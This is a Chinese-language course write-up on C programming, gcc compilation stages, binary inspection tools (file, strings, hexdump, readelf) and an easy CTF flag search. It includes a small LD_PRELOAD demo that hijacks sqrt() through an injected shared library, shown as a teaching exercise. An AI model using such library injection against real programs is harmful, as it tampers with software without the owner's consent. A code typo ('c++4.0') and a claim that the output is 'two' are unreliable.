---
description: 第一次上ISIP的課
title: 1/28、1/31 SecurityFocus Online
pubDate: 2024-01-28 20:32:21
tags:
  -  writeup
categories:
  - Daily
---

SecurityFocus Online

# Linux C

## 編譯與執行

### 範例1:輸入與輸出

```c++
#include <stdio.h>

int main(void) {
	float miles;

	printf("Please enter miles:");
	scanf("%f", &miles);

	float kilometers = miles * 1.6;

	printf("%f Kilometers", kilometers);
}
```

#### 執行與編譯結果

- 輸入
  ![image](https://hackmd.io/_uploads/rk3HLCN9p.png)
- 結果
  ![image](https://hackmd.io/_uploads/HkY3L045a.png)
- 理解與構思：英里轉公里
  `float kilometers = miles * 1.6;`英里是公里的1.6倍，所以直接乘以1.6即可

---

### 範例3:格式化輸入與輸出 | 算術運算子（Arithmetic Operators）

```c++
#include <stdio.h>
#include <math.h>

int main()
{
   float a = 1.0, b = 6.0, c++4.0;
   printf ("%.4f", sqrt(a+b*c));
   return 0;
}
```

#### 執行與編譯結果

- 輸入
  ![image](https://hackmd.io/_uploads/rymXc049a.png)
- 過程中報錯
  ![image](https://hackmd.io/_uploads/ryp8cAVqT.png)

- ``/usr/bin/ld: /tmp/ccFkUuaF.o: in function `main':
PLAYGROUND.c:(.text+0x38): undefined reference to `sqrt'
collect2: error: ld returned 1 exit status``

- 修復報錯
  `sqrt`需要連結 math 函式庫。但在Linux中，這個函式庫通常被稱為 libm，因此需要在編譯時告訴編譯器連結 libm。所以編譯指令需要這去寫：
  `gcc PLAYGROUND.c -lm -o PLAYGROUND`

- 結果
  ![image](https://hackmd.io/_uploads/rkZvj049p.png)

### 範例11:迴圈設計

- 練習作業:在console端輸入n == > 輸出:n!=1_2_3*….*n的結果
  - 使用三種loop技術撰寫

```c++
//FOR LOOP
#include <stdio.h>
int main(){
    int n, i, sum = 1; //由於是階乘，故sum = 1 必為預設
    printf("Enter a positive integer: ");
    scanf("%d", &n);
    for (i = 1; i <= n; ++i){
        sum *= i;
    }
    printf("Sum = %d", sum);
    return 0;
}
```

- 輸入與結果

1. ![image](https://hackmd.io/_uploads/B17wb1Hca.png)
2. ![image](https://hackmd.io/_uploads/BkF2lyBqp.png)

---

```c++
//WHILE LOOP
#include <stdio.h>
int main(){
    int n, i, sum = 1;
    printf("Enter a positive integer: ");
    scanf("%d", &n);
    i = 1;
    while (i <= n){
        sum *= i;
        ++i;
    }
    printf("Sum = %d", sum);
    return 0;
}
```

1. ![image](https://hackmd.io/_uploads/r13hz1Bc6.png)
2. ![image](https://hackmd.io/_uploads/r1117kB5p.png)

---

```c++
//DO While LOOP
#include <stdio.h>
int main() {
    int n, i, sum = 1;
    printf("Enter a positive integer: ");
    scanf("%d", &n);
    i = 1;
    do{
      sum *= i;
      ++i;
    } while (i <= n);
    printf("Sum = %d", sum);
    return 0;
}
```

1. ![image](https://hackmd.io/_uploads/SJUjXyB9T.png)

2. ![image](https://hackmd.io/_uploads/ByVO4kH5p.png)

---

- 練習作業:底下輸出結果是多少? and why?

```c++
#include <stdio.h>
#include <stdlib.h>
int main(void) {
  int x;
  float y;
  for (x=0, y=50; x<25; x+=5, y/=2)
    printf("x=%d, y=%4.2f\n", x, y);
  return 0;
}
```

- 輸入與結果

1. ![image](https://hackmd.io/_uploads/BJL2VJrcp.png)

   - 結果
     ![image](https://hackmd.io/_uploads/Sk8JBJSca.png)

- 解釋：
  1.  初始時，x 設為 0，y 設為 50。
  2.  進入循環，輸出 x 和 y 的值。
  3.  在每次循環中，x 都增加 5，y 都除以 2。
  4.  循環結束條件是 x < 25，當 x 達到或超過 25 時，循環停止。

---

### 範例16:費式序列Fibonacci Serie

- 費式序列Fibonacci Series: 0 1 1 2 3 5 8 13 21 34
- f(0)=0, f(1)=1, f(n)=f(n-1)+f(n-2)
- 底下是用迴圈方式計算費式序列Fibonacci Serie
- ==作業:使用遞迴函數方式計算費式序列Fibonacci Serie==

```c++
// 遞迴
#include <stdio.h>
long long f(int n){
    if(n==0) return 0;
    if(n==1) return 1;
    return f(n-1)+f(n-2);
}
int main(){
    int n;
    scanf("%d",&n);
    printf("%lld",f(n));
}
```

- 輸入與結果
  - ![image](https://hackmd.io/_uploads/rkNlO1H5p.png)
  - ![image](https://hackmd.io/_uploads/B10GukSqT.png)

```c++
//遞迴解法2 （減少計算重複項目）
#include <stdio.h>
long long F[1000005];
long long f(int n) {
    if (n == 0) return 0;
    if (n == 1) return 1;
    if (F[n] != -1) return F[n];
    F[n] = f(n - 1) + f(n - 2);
    return F[n];
}
int main() {
    for (int i = 0; i < 1000000; i++){
        F[i] = -1;
    }
    int n;
    scanf("%d", &n);
    printf("%lld\n", f(n));
    return 0;
}
```

- 輸入與結果
  - ![image](https://hackmd.io/_uploads/rySXFyrqT.png)
  - ![image](https://hackmd.io/_uploads/S1MRFyHc6.png)
- 原理與解釋

1.  `long long F[1000005];`: 宣告一個陣列 `F` 用來存儲 Fibonacci 數列的計算結果。
2.  `long long f(int n)`: 定了一個遞迴函數 `f`，用來計算 Fibonacci 數列的第 `n` 項。如果 `n` 為 0，返回 0；如果 `n` 為 1，返回 1。如果 `F[n]` 不等於 -1，==表示已經計算過 `f(n)`，直接返回 `F[n]`==；否則，計算 `f(n-1) + f(n-2)` 並將結果存入 `F[n]`，最後返回 `F[n]`。

---

# 從原始碼到可執行檔

```c++
#include <stdio.h>

#define FORMAT_STRING "%s"  //定義FORMAT_STRING為%s字串輸出
#define MESSAGE "Hello, CTFer!\n" //定義MESSAGE為要輸出的字串內容

int
main(int argc, char *argv[]) {
  printf(FORMAT_STRING, MESSAGE); //輸出結果然後換行
  return 0;
}
```

- 輸入與結果
  - ![image](https://hackmd.io/_uploads/HyBB2lS5T.png)
  - ![image](https://hackmd.io/_uploads/SJ7cCgBqa.png)

## gcc的參數

- 原始程式: PLAYGROUND.c
- 預處理階段 ==\> gcc –E PLAYGROUND.c –o PLAYGROUND.i
- 編譯階段 ==\> gcc –S PLAYGROUND.i –o PLAYGROUND.s
- 組譯階段 ==\> gcc –c PLAYGROUND.s –o PLAYGROUND.o
- 連結階段 ==\> gcc PLAYGROUND.o –o PLAYGROUND
- export LD_LIBRARY_PATH=.

---

**原程式->PLAYGROUND.c**

```c++
#include <stdio.h>
int main(){
    printf("Wu YiHung\n");
   return 0;
}
```

- 輸入![image](https://hackmd.io/_uploads/rkcJr-S56.png)

1. 預處理階段 ==\> `gcc -E PLAYGROUND.c -o PLAYGROUND.i`
   - 輸入與結果
     - 確認有.i的檔案![image](https://hackmd.io/_uploads/BJd2r-S5a.png)
     - 嘗試打開，出現，這個階段是將標頭檔`stdio.h`爆開 ![image](https://hackmd.io/_uploads/SylLQIZBqp.png)

```txt
# 0 "PLAYGROUND.c"
# 0 "<built-in>"
# 0 "<command-line>"
# 1 "/usr/include/stdc-predef.h" 1 3 4
# 0 "<command-line>" 2
# 1 "PLAYGROUND.c"
# 1 "/usr/include/stdio.h" 1 3 4
# 27 "/usr/include/stdio.h" 3 4
# 1 "/usr/include/aarch64-linux-gnu/bits/libc-header-start.h" 1 3 4
# 33 "/usr/include/aarch64-linux-gnu/bits/libc-header-start.h" 3 4
# 1 "/usr/include/features.h" 1 3 4
# 392 "/usr/include/features.h" 3 4
# 1 "/usr/include/features-time64.h" 1 3 4
# 20 "/usr/include/features-time64.h" 3 4

~~~中間省略數百行

extern void funlockfile (FILE *__stream) __attribute__ ((__nothrow__ , __leaf__));
# 885 "/usr/include/stdio.h" 3 4
extern int __uflow (FILE *);
extern int __overflow (FILE *, int);
# 902 "/usr/include/stdio.h" 3 4

# 2 "PLAYGROUND.c" 2

# 2 "PLAYGROUND.c"
int main(){
    printf("Wu YiHung\n");
   return 0;
}
```

---

2. 編譯階段 ==\> `gcc -S PLAYGROUND.i -o PLAYGROUND.s`

   - 輸入與結果
   - 執行後，產生.s檔![image](https://hackmd.io/_uploads/rydJ_Wr9T.png)
   - 直接打開`PLAYGROUND.s`![image](https://hackmd.io/_uploads/HyyIOWHc6.png)

   ```txt
   yih@yih:~/Documents/C$ cat PLAYGROUND.s
       .arch armv8-a
       .file	"PLAYGROUND.c" //指定了文件的名稱
       .text
       .section	.rodata
       .align	3
   .LC0:
       .string	"Wu YiHung"
       .text
       .align	2
       .global	main
       .type	main, %function //表示程式的開始
   main:
   .LFB0: //這是函數開始（LFB）標籤，下方是記憶體緩存暫存的地址(動態資訊)
       .cfi_startproc
       stp	x29, x30, [sp, -16]!
       .cfi_def_cfa_offset 16
       .cfi_offset 29, -16
       .cfi_offset 30, -8
       mov	x29, sp
       adrp	x0, .LC0
       add	x0, x0, :lo12:.LC0
       bl	puts
       mov	w0, 0
       ldp	x29, x30, [sp], 16
       .cfi_restore 30
       .cfi_restore 29
       .cfi_def_cfa_offset 0
       ret
       .cfi_endproc
   .LFE0: //這是函數結束（LFE）標籤
       .size	main, .-main
       .ident	"GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0" //GCC 的版本
       .section	.note.GNU-stack,"",@progbits
   ```

3. 組譯階段 ==\> `gcc -c PLAYGROUND.s -o PLAYGROUND.o`
   - 輸入與結果 - 執行後產生`.o`檔![image](https://hackmd.io/_uploads/BkfH9ZB96.png) - 開啟後，就出現了亂碼!![image](https://hackmd.io/_uploads/rkKkj-r56.png) - 只能從中得知是二進制文件（ELF格式的可執行文件）

---

4. 連結階段 ==\> `gcc PLAYGROUND.o -o PLAYGROUND`

   - 輸入與結果
     - 執行後新增了`PLAYGROUND`檔![image](https://hackmd.io/_uploads/H1ex2WB9a.png)

5. 執行檔案 ==\> `./PLAYGROUND`

- 最後執行該結果![image](https://hackmd.io/_uploads/BJqS2bH5p.png)

6. 檢視檔案大小==\> ls -al PLAYGROUND.\*![image](https://hackmd.io/_uploads/HJ1xaWH5T.png)

   ![image](https://hackmd.io/_uploads/rkFNa-rcp.png)

---

### 組合語言格式:INTEL vs AT&T 格式

- 產生AT&T語法格式的組語(gcc預設使用的格式) ==> gcc -S `-masm=att` PLAYGROUND.c -o PLAYGROUND_att.s

* 發現問題，想到既然在gcc是預設，那何必加入這段？![image](https://hackmd.io/_uploads/B1k2RWH9p.png)
* 確實可以![image](https://hackmd.io/_uploads/HkehVJGB5p.png)

- 開啟後結果![image](https://hackmd.io/_uploads/ByVOJMBqT.png)

  - PLAYGROUND_att.s

  ```txt
      .arch armv8-a
      .file	"PLAYGROUND.c"
      .text
      .section	.rodata
      .align	3
  .LC0:
      .string	"Wu YiHung"
      .text
      .align	2
      .global	main
      .type	main, %function
  main:
  .LFB0:
      .cfi_startproc
      stp	x29, x30, [sp, -16]!
      .cfi_def_cfa_offset 16
      .cfi_offset 29, -16
      .cfi_offset 30, -8
      mov	x29, sp
      adrp	x0, .LC0
      add	x0, x0, :lo12:.LC0
      bl	puts
      mov	w0, 0
      ldp	x29, x30, [sp], 16
      .cfi_restore 30
      .cfi_restore 29
      .cfi_def_cfa_offset 0
      ret
      .cfi_endproc
  .LFE0:
      .size	main, .-main
      .ident	"GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0"
      .section	.note.GNU-stack,"",@progbits
  ```

- 產生Intel語法格式的組語(微軟預設使用的格式) ==> gcc -S `-masm=intel` PLAYGROUND.c `-o` PLAYGROUND_intel.s
  - 發生問題![image](https://hackmd.io/_uploads/SJvIgfHcp.png)
  - 我用windows的windows powershell試看看，運行無報錯![image](https://hackmd.io/_uploads/Hke9978cT.png)
  - 運行結果![image](https://hackmd.io/_uploads/HkDJoQU9a.png)
- PLAYGROUND_intel.s
  ```txt!
          .file   "PLAYGROUND.c"
          .intel_syntax noprefix
          .text
          .def    __main; .scl    2;      .type   32;     .endef
          .section .rdata,"dr"
  .LC0:
          .ascii "Wu YiHung\0"
          .text
          .globl  main
          .def    main;   .scl    2;      .type   32;     .endef
          .seh_proc       main
  main:
          push    rbp
          .seh_pushreg    rbp
          mov     rbp, rsp
          .seh_setframe   rbp, 0
          sub     rsp, 32
          .seh_stackalloc 32
          .seh_endprologue
          call    __main
          lea     rcx, .LC0[rip]
          call    puts
          mov     eax, 0
          add     rsp, 32
          pop     rbp
          ret
          .seh_endproc
          .ident  "GCC: (x86_64-win32-seh-rev0, Built by MinGW-W64 project) 8.1.0"
          .def    puts;   .scl    2;      .type   32;     .endef
  ```

### 比較之結果

## ![image](https://hackmd.io/_uploads/rkZk8Ia26.png)

# LD_PRELOAD

## 實作範例與結果

### 範例程式

```c++
//PLAYGROUND.c
#include <stdio.h>
#include <math.h>
int main() {
  double x;
  scanf("%lf", &x);
  printf("%f\n", sqrt(x));
  return 0;
}
```

- 輸入![image](https://hackmd.io/_uploads/Skt257v5a.png)
- 執行結果![image](https://hackmd.io/_uploads/S1CesXw5a.png)

### 駭入程式範例

```txt
//inject.c
double sqrt(double x) {
  return 1122334455;
}
```

### 編譯並執行看看被竄改的答案

- 執行指令
  1. `gcc -o inject.so -shared inject.c`
  2. `LD_PRELOAD=./inject.so ./PLAYGROUND`

### 比較

- 主要程式碼是要求輸入值的開根號，但有了`inject.c`的注入，不管輸入值是多少，僅會輸出二
  - inject.c中的 `retrun 1122334455;`![image](https://hackmd.io/_uploads/HJ7aK7C26.png)

---

# Linux 執行檔分析

## Linux file命令(command)

- 指令
  - `file /bin/ls`
    - 結果![image](https://hackmd.io/_uploads/By1UWEw5p.png)
  - `file xxx.png`
    - 結果![image](https://hackmd.io/_uploads/ry8kfNP96.png)
  - `file xxx.doc`
    - 結果![image](https://hackmd.io/_uploads/S1fIfEvcT.png)
  - `file xxx.pdf`
    - 結果![image](https://hackmd.io/_uploads/BJRtfED5T.png)

## strings

- `strings /bin/ls` - 一堆東西![image](https://hackmd.io/_uploads/ByuXmVvc6.png)
  - `strings /bin/ls | grep Copyright`
    - 找到關鍵字![image](https://hackmd.io/_uploads/SkoIXVDqa.png)
  - `strings hexedit | grep CTF`
    - 結果![image](https://hackmd.io/_uploads/BJzlVEwca.png)

## hexdump | hd

顯示執行畫面與解說

- ELF(Executable and Linkable Format) 的檔案特徵![image](https://hackmd.io/_uploads/ryMU84w56.png)![image](https://hackmd.io/_uploads/Sycb2Evcp.png)

- MP3 的檔案特徵![image](https://hackmd.io/_uploads/HJxg34w56.png)![image](https://hackmd.io/_uploads/HkCGnVP56.png)

- .jpg 的檔案特徵
  ![image](https://hackmd.io/_uploads/Sy0EqO_9T.png)
  ![image](https://hackmd.io/_uploads/HJsX5ud9a.png)

- .png 的檔案特徵
  ![image](https://hackmd.io/_uploads/HyMD5d_qa.png)
  ![image](https://hackmd.io/_uploads/SyQd9Od5a.png)

## size

- 輸入與結果![image](https://hackmd.io/_uploads/B13RgBwqp.png)
- 在這個檔案中，總大小為 2806 bytes
- hex（十六進位表示）：af6

---

- 先把檔案下載下來![image](https://hackmd.io/_uploads/rkWTtzHqp.png)
- 輸入`git clone https://github.com/MyFirstSecurity2020/DATA202401.git`![image](https://hackmd.io/_uploads/Hkzy5Mr9T.png)

## [DATA202401](https://github.com/MyFirstSecurity2020/DATA202401)

### DAY1

#### hexedit

- 直接先把檔案打開，就會看到flag，但這也很考驗眼力
  - ![image](https://hackmd.io/_uploads/ByutTWLcp.png)
- 可以用strings 然後在grep出來即可
  - ![image](https://hackmd.io/_uploads/HJ-eRZI9T.png)

#### networkingOK.pcap

- 也可以使用相同的方式
  - ![image](https://hackmd.io/_uploads/ryzLC-8qp.png)

---

---

# readelf

- 顯示 /bin/ls 二進位檔案的 `ELF 表頭(ELF Header)` ==\> readelf -h /bin/ls![image](https://hackmd.io/_uploads/r18mtrPca.png)

- 顯示Section Headers (-S 大寫) ==> readelf -S /bin/ls
  - 此選項顯示有關 ELF 檔案中每個sections的詳細資訊。節標題包括名稱(Name)、類型(Type)、地址(Address)、大小和其他屬性。![image](https://hackmd.io/_uploads/SkKxqSP56.png)
  - 完整結果
    ` There are 28 section headers, starting at offset 0x1e428:`
  ```txt
  Section Headers:
    [Nr] Name              Type             Address           Offset
         Size              EntSize          Flags  Link  Info  Align
    [ 0]                   NULL             0000000000000000  00000000
         0000000000000000  0000000000000000           0     0     0
    [ 1] .interp           PROGBITS         0000000000000238  00000238
         000000000000001b  0000000000000000   A       0     0     1
    [ 2] .note.gnu.bu[...] NOTE             0000000000000254  00000254
         0000000000000024  0000000000000000   A       0     0     4
    [ 3] .note.ABI-tags     NOTE             0000000000000278  00000278
         0000000000000020  0000000000000000   A       0     0     4
    [ 4] .gnu.hash         GNU_HASH         0000000000000298  00000298
         0000000000000040  0000000000000000   A       5     0     8
    [ 5] .dynsym           DYNSYM           00000000000002d8  000002d8
         0000000000000bb8  0000000000000018   A       6     3     8
    [ 6] .dynstr           STRTAB           0000000000000e90  00000e90
         000000000000058f  0000000000000000   A       0     0     1
    [ 7] .gnu.version      VERSYM           0000000000001420  00001420
         00000000000000fa  0000000000000002   A       5     0     2
    [ 8] .gnu.version_r    VERNEED          0000000000001520  00001520
         0000000000000090  0000000000000000   A       6     3     8
    [ 9] .rela.dyn         RELA             00000000000015b0  000015b0
         0000000000001560  0000000000000018   A       5     0     8
    [10] .rela.plt         RELA             0000000000002b10  00002b10
         00000000000009c0  0000000000000018  AI       5    22     8
    [11] .init             PROGBITS         00000000000034d0  000034d0
         0000000000000018  0000000000000000  AX       0     0     4
    [12] .plt              PROGBITS         00000000000034f0  000034f0
         00000000000006a0  0000000000000000  AX       0     0     16
    [13] .text             PROGBITS         0000000000003bc0  00003bc0
         0000000000012640  0000000000000000  AX       0     0     64
    [14] .fini             PROGBITS         0000000000016200  00016200
         0000000000000014  0000000000000000  AX       0     0     4
    [15] .rodata           PROGBITS         0000000000016220  00016220
         000000000000487a  0000000000000000   A       0     0     16
    [16] .eh_frame_hdr     PROGBITS         000000000001aa9c  0001aa9c
         0000000000000564  0000000000000000   A       0     0     4
    [17] .eh_frame         PROGBITS         000000000001b000  0001b000
         0000000000002000  0000000000000000   A       0     0     8
    [18] .init_array       INIT_ARRAY       000000000002d000  0001d000
         0000000000000008  0000000000000008  WA       0     0     8
    [19] .fini_array       FINI_ARRAY       000000000002d008  0001d008
         0000000000000008  0000000000000008  WA       0     0     8
    [20] .data.rel.ro      PROGBITS         000000000002d010  0001d010
         0000000000000a08  0000000000000000  WA       0     0     8
    [21] .dynamic          DYNAMIC          000000000002da18  0001da18
         0000000000000210  0000000000000010  WA       6     0     8
    [22] .got              PROGBITS         000000000002dc28  0001dc28
         00000000000003d8  0000000000000008  WA       0     0     8
    [23] .data             PROGBITS         000000000002e000  0001e000
         0000000000000298  0000000000000000  WA       0     0     8
    [24] .bss              NOBITS           000000000002e298  0001e298
         00000000000012a8  0000000000000000  WA       0     0     8
    [25] .gnu_debugaltlink PROGBITS         0000000000000000  0001e298
         000000000000004a  0000000000000000           0     0     1
    [26] .gnu_debuglink    PROGBITS         0000000000000000  0001e2e4
         0000000000000034  0000000000000000           0     0     4
    [27] .shstrtab         STRTAB           0000000000000000  0001e318
         000000000000010f  0000000000000000           0     0     1
  Key to Flags:
    W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
    L (link order), O (extra OS processing required), G (group), T (TLS),
    C (compressed), x (unknown), o (OS specific), E (exclude),
    D (mbind), p (processor specific)
  ```
- 顯示符號表 (-s 小寫) ==> readelf -s /bin/ls
  - 符號表包含有關二進位檔案中使用的符號的信息，包括函數和變數。這對於理解程序邏輯非常寶貴。![image](https://hackmd.io/_uploads/SkKS3SDqp.png)

```txt
    Symbol table '.dynsym' contains 125 entries:
   Num:    Value          Size Type    Bind   Vis      Ndx Name
     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND
     1: 00000000000034d0     0 SECTION LOCAL  DEFAULT   11 .init
     2: 000000000002e000     0 SECTION LOCAL  DEFAULT   23 .data
     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND m[...]@GLIBC_2.17 (2)
     4: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND memcpy@GLIBC_2.17 (2)
     5: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND m[...]@GLIBC_2.17 (2)
     6: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _exit@GLIBC_2.17 (2)
     7: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND getcwd@GLIBC_2.17 (2)
     8: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND f[...]@GLIBC_2.17 (2)
     9: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strlen@GLIBC_2.17 (2)
    10: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
    11: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND m[...]@GLIBC_2.17 (2)
    12: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND exit@GLIBC_2.17 (2)
    13: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
    14: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND raise@GLIBC_2.17 (2)
    15: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.34 (3)
    16: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND error@GLIBC_2.17 (2)
    17: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND p[...]@GLIBC_2.17 (2)
    18: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterT[...]
    19: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND s[...]@GLIBC_2.17 (2)
    20: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND l[...]@GLIBC_2.17 (2)
    21: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND setenv@GLIBC_2.17 (2)
    22: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND r[...]@GLIBC_2.17 (2)
    23: 0000000000000000     0 FUNC    WEAK   DEFAULT  UND _[...]@GLIBC_2.17 (2)
    24: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND o[...]@GLIBC_2.17 (2)
    25: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND s[...]@GLIBC_2.17 (2)
    26: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
    27: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND i[...]@GLIBC_2.17 (2)
    28: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND c[...]@GLIBC_2.17 (2)
    29: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND stderr@GLIBC_2.17 (2)
    30: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND lseek@GLIBC_2.17 (2)
    31: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
    32: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND optarg@GLIBC_2.17 (2)
    33: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
    34: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND s[...]@GLIBC_2.17 (2)
    35: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND l[...]@GLIBC_2.17 (2)
    36: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fileno@GLIBC_2.17 (2)
    37: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
    38: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND signal@GLIBC_2.17 (2)
    39: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
    40: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
    41: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fclose@GLIBC_2.17 (2)
    42: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND n[...]@GLIBC_2.17 (2)
    43: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND malloc@GLIBC_2.17 (2)
    44: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND optind@GLIBC_2.17 (2)
    45: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@LIBSELINUX_1.0 (4)
    46: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND w[...]@GLIBC_2.17 (2)
    47: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND tzset@GLIBC_2.17 (2)
    48: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND w[...]@GLIBC_2.17 (2)
    49: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND s[...]@GLIBC_2.17 (2)
    50: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND s[...]@GLIBC_2.17 (2)
    51: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND b[...]@GLIBC_2.17 (2)
    52: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND stdout@GLIBC_2.17 (2)
    53: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
    54: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND memset@GLIBC_2.17 (2)
    55: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND g[...]@GLIBC_2.17 (2)
    56: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND calloc@GLIBC_2.17 (2)
    57: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND lstat@GLIBC_2.33 (5)
    58: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND r[...]@GLIBC_2.17 (2)
    59: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND r[...]@GLIBC_2.17 (2)
    60: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
    61: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND c[...]@GLIBC_2.17 (2)
    62: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
    63: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND s[...]@GLIBC_2.17 (2)
    64: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND s[...]@GLIBC_2.17 (2)
    65: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND t[...]@GLIBC_2.17 (2)
    66: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
    67: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND mktime@GLIBC_2.17 (2)
    68: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (6)
    69: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND s[...]@GLIBC_2.17 (2)
    70: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND abort@GLIBC_2.17 (2)
    71: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND m[...]@GLIBC_2.17 (2)
    72: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
    73: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND g[...]@GLIBC_2.17 (2)
    74: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND memcmp@GLIBC_2.17 (2)
    75: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND t[...]@GLIBC_2.17 (2)
    76: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND s[...]@GLIBC_2.17 (2)
    77: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND g[...]@GLIBC_2.17 (2)
    78: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
    79: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND s[...]@GLIBC_2.17 (2)
    80: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strcmp@GLIBC_2.17 (2)
    81: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND g[...]@GLIBC_2.17 (2)
    82: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
    83: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fseeko@GLIBC_2.17 (2)
    84: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND free@GLIBC_2.17 (2)
    85: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
    86: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strchr@GLIBC_2.17 (2)
    87: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND statx@GLIBC_2.28 (7)
    88: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fwrite@GLIBC_2.17 (2)
    89: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND f[...]@GLIBC_2.17 (2)
    90: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND f[...]@GLIBC_2.17 (2)
    91: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fflush@GLIBC_2.17 (2)
    92: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strcpy@GLIBC_2.17 (2)
    93: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND dirfd@GLIBC_2.17 (2)
    94: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND u[...]@GLIBC_2.17 (2)
    95: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
    96: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND isatty@GLIBC_2.17 (2)
    97: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND w[...]@GLIBC_2.17 (2)
    98: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND g[...]@GLIBC_2.17 (2)
    99: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND f[...]@GLIBC_2.17 (2)
   100: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND p[...]@GLIBC_2.17 (2)
